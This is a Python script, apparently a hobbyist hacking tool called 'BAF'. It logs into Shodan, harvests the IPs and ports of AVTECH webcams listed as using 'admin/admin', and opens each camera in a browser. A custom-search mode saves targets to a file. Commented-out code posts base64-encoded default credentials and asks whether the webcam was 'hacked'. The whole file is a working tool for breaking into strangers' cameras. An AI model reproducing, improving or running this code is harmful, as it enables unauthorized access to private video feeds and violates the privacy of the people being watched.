import requests,time
import httplib, urllib
import time
from bs4 import BeautifulSoup
from selenium import webdriver
import sys
from selenium.webdriver.common.keys import Keys
from termcolor import colored
from colored import fg, bg, attr



def v4_check(hi):	
	counts=0
	for i in range (0,len(hi.a['href'])):
		if(hi.a['href'][i]==':'or hi.a['href'][i]=='%'):
 			counts=counts+1
	return counts

def ipv6_extractor(hi):
	start=0
	end=0
	coded_pos=0
	for i in range (0,len(hi.a['href'])):
		if(hi.a['href'][i]=='['):
 			start=i
		if(hi.a['href'][i]==']'):
			end=i
		if(hi.a['href'][i]=='/'):
			coded_pos=i
	
	return start,end,coded_pos

def prnt_targets(ip_lst):

	n=len(ip_lst)
	print ('%s\n%s' % (fg(1), attr(1)))
	print ('%s  printing ips & ports .. refer to the targets.txt file for processing them with your own flavor ;) %s' % (fg(1), attr('reset')))
	print ('%s\n%s' % (fg(2), attr(1)))
	for i in range(0,n):
		print(i,ip_lst[i],port_lst[i])
		if(i==0):
			with open("Desktop/python/output.txt", "w") as text_file:
    				text_file.write(ip_lst[i]+":"+port_lst[i]+'\n')
		else:
			with open("Desktop/python/output.txt", "a") as text_file:
    				text_file.write(ip_lst[i]+":"+port_lst[i]+'\n')
	return


def auto_open(ip_lst,port_lst):
 
	n=len(ip_lst)
	lnk=[]
	for i in range(0,n):
		lnk.append("http://"+ip_lst[i]+":"+port_lst[i])
		driver = webdriver.Firefox()
		driver.get(lnk[i])
		choes=raw_input('open the next cam? y/n ')
		if(choes=='y'):
			continue
		else:
			print('type y or ctrl+z to exit')
		
	return
def print_logo():

	print ('%s\n%s' % (fg(1), attr(1)))
	print ('%s  /$$$$$$$    /$$$$$$   /$$$$$$$$ %s' % (fg(1), attr(1)))
	print ('%s | $$__  $$  /$$__  $$ | $$_____/ %s' % (fg(1), attr(1)))
	print ('%s | $$  \ $$ | $$  \ $$ | $$       %s' % (fg(1), attr(1)))
	print ('%s | $$$$$$$  | $$$$$$$$ | $$$$$    %s' % (fg(1), attr(1)))
	print ('%s | $$$$$$$  | $$$$$$$$ | $$$$$    %s' % (fg(1), attr(1)))
	print ('%s | $$__  $$ | $$__  $$ | $$__/    %s' % (fg(1), attr(1)))
	print ('%s | $$  \ $$ | $$  | $$ | $$       %s' % (fg(1), attr(1)))
	print ('%s | $$  \ $$ | $$  | $$ | $$       %s' % (fg(1), attr(1)))
	print ('%s | $$$$$$$/ | $$  | $$ | $$       %s' % (fg(1), attr(1)))
	print ('%s |_______/  |__/  |__/ |__/       %s' % (fg(1), attr(1)))
	print "\n"
	print ('%s 	version [0.1.0] %s' % (fg(1), attr('reset')))
 	print "\n"
	return

#proxies in this code used to intercept requests and responses to automate the DOM manipulation process
"""
def my_proxy(PROXY_HOST,PROXY_PORT):
        fp = webdriver.FirefoxProfile()
        # Direct = 0, Manual = 1, PAC = 2, AUTODETECT = 4, SYSTEM = 5
        print "using proxy " + PROXY_HOST +":"+ PROXY_PORT  
        fp.set_preference("network.proxy.type", 1)
        fp.set_preference("network.proxy.http",PROXY_HOST)
        fp.set_preference("network.proxy.http_port",int(PROXY_PORT))
        #fp.set_preference("general.useragent.override","whater_useragent")
        fp.update_preferences()
        return webdriver.Firefox(firefox_profile=fp)

http_proxy  = "127.0.0.1:8080"
proxyDict = { 
              "http"  : http_proxy
            }
"""
def autologin(ip,port,frst):
	"""
	
	m = requests.Session()
	#driver = my_proxy('127.0.0.1','8080')
	driver = webdriver.Firefox()
	lnk="http://"+ip+":"+port
	driver.get(lnk)
	#driver.execute_script('''var link = arguments[0];window.open("link","_blank");''',lnk)
	logged=driver.execute_script("confirm('ar u logged in with admin/admin?')")
	if logged == True:
		frst=False
		driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 't') 

	elif logged == False:
		if frst == True:
			frst=False
		elif frst == False:
			driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 'w') 





	cap=raw_input('enter captcha , type none if no captcha ');
								
	if cap != "none":
		print "ur cap is > " + cap
		pars = { 'account': 'YWRtaW46YWRtaW4','captcha_code': cap} 
	else: 
		pars = { 'account': 'YWRtaW46YWRtaW4'}
	"""
	#resp = m.get("%s" % lnk, data=pars) #,proxies=proxyDict)  
	#print resp
	#driver = webdriver.PhantomJS()
	#driver.delete_all_cookies()
	"""key=[]
	value=[]
	for i in range(0,len(m.cookies.get_dict().keys())):
		key.append(str(m.cookies.get_dict().keys()[i]))
		value.append(str(m.cookies.get_dict()[key[i]]))
		driver.add_cookie({'name':key[i], 'value':value[i]})
		print "key="+key[i]+"  "+"value=" + value[i]
	"""
	"""
	hacked=driver.execute_script("return confirm('did the webcam open?')")
	if hacked == True:
		driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 't') 
		driver.get(lnk)
	elif hacked == False:
		driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 'w') 
		driver.close()
	"""
	return 
print_logo()
#shodan auto login 
s = requests.Session()
name=raw_input("enter your shodan's account username :")
passwd=raw_input("enter your shodan's account password :")
pars = { 'username': name, 'password': passwd}
resp = s.post("https://account.shodan.io/login", data=pars)
#print resp
driver = webdriver.Firefox()
#driver = webdriver.PhantomJS()
driver.get("https://shodan.io")
#driver.delete_all_cookies()
key=[]
value=[]
for i in range(0,len(s.cookies.get_dict().keys())):
	key.append(str(s.cookies.get_dict().keys()[i]))
	value.append(str(s.cookies.get_dict()[key[i]]))
	driver.add_cookie({'name':key[i], 'value':value[i]})
	

#go to the website logged in 	
driver.get("https://shodan.io")

#searching for ips and ports on the first 5 pages of the results and storing them in 2 lists (ie:ip&port lists)
ip_lst=[]
port_lst=[]
choice=raw_input("step1 > finding targets ... choose \n 1- webcams (admin/admin)\n 2- custom search \n")
for pagenum in range (1,6) :
	if choice in ['2']:
		if pagenum==1 :
			query=raw_input('what do you want to search for?')
		params = urllib.urlencode({'query':query , 'page':pagenum})
		driver.get("https://www.shodan.io/search?%s" % params)
	elif choice in ['1']:
		params = urllib.urlencode({'page':pagenum})
		driver.get("https://www.shodan.io/search?query=linux+upnp+avtech&%s" % params)
	html = driver.page_source
	soup = BeautifulSoup(html,"lxml")
	if soup.find("div","msg alert alert-info")!="None":
		if soup.find("div","msg alert alert-info") in ['No results found']:
			print "No results found"
			sys.exit()
		else:		
			hi= soup.find("div","ip")
			if hi is None :		
				break
			ip='none'
			por='none'
			for count in range (1,11):
				if hi is None :
					break	
					break
				start=0
				end=0
				coded=False
				if ':' in hi.a['href']:				
						port=True
				else:
					port= False
			
				if hi.a['href'][0:5] in ['https']:
					if port==True and v4_check(hi)==2 :
						ip, por=hi.a['href'][8:].split(':')
					elif port==True and v4_check(hi)!=2 :
						start,end,coded=ipv6_extractor(hi)
						ip, por=hi.a['href'][end:].split(':')
						if coded==False:
							ip=hi.a['href'][start+1:end]
						else:
							ip=hi.a['href'][end+2:]
					else:
						ip=hi.a['href'][8:]
				elif hi.a['href'][0:4] in ['http']:
					if port==True and v4_check(hi)==2:
						ip, por = hi.a['href'][7:].split(':')
					elif port==True and v4_check(hi)!=2:
						start,end,coded=ipv6_extractor(hi)
						ip, por = hi.a['href'][end:].split(':')
						if coded==False:
						
							ip=hi.a['href'][start+1:end]
						else:
							
							ip=hi.a['href'][end+2:]
					else:
						ip=hi.a['href'][7:]
				elif hi.a['href'][0:1]in ['/'] and v4_check(hi)==0:
					if port==True:
						ip, por = hi.a['href'][6:].split(':')
					else:
						ip=hi.a['href'][6:]
				elif hi.a['href'][0:1]in ['/'] and v4_check(hi)!=0:
					start,end,coded_pos=ipv6_extractor(hi)
					ip=hi.a['href'][coded_pos+1:]
				ip_lst.append(str(ip))
				port_lst.append(str(por)) 
				hi=hi.findNext("div","ip")


if choice in ['2']:
	prnt_targets(ip_lst)
if choice in ['1']:
	auto_open(ip_lst,port_lst)
	

